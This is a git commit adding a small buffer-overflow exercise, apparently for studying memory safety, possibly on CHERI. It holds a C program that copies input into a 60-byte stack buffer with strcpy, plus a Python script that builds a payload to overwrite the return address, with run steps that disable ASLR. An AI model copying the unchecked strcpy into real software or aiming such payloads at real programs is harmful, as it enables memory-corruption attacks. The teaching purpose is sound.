9b381859b25babacc024420e880ee5cdfa703de7
pglbgit2 <pierre.gilles.le.botlan@gmail.com>
2024-04-30 12:54:41 +0200

    unzip dont work in cheri so updating with direct content

---
+++ test/script.py
@@ -0,0 +1,11 @@
+buf = "A"*72+"\x75\x51\x55\x55\x55\x55"
+print(buf)
+
+#0x5555555551
+#0x555555555188
+
+# setarch -RL bash
+# gcc -o main main.c -Wall
+# python3 script.py > entry
+# ./main < entry
+# take function address and separate it two by two then reverse the pairs order to put it at end of buf
---
+++ test2/main.c
@@ -0,0 +1,30 @@
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void func(void){
+   printf("testing something\n");
+}
+
+void copy(char * arg){
+  char buffer[60];
+  
+  printf("true return address: %p\n",__builtin_return_address(0));
+  strcpy(buffer, arg);
+  printf("after strcpy\n");
+  printf("buf:%p\n",buffer);
+  printf("funct:%p\n",func);
+  printf("true return address: %p\n",__builtin_return_address(0));
+  printf("everything:%s\n",buffer);
+
+  
+
+}
+
+int main(int argc, char **argv){
+  char * buf = calloc(500,1);
+  scanf("%s",buf);
+  copy(buf);
+  printf("normal exit\n");
+  return 0;
+}
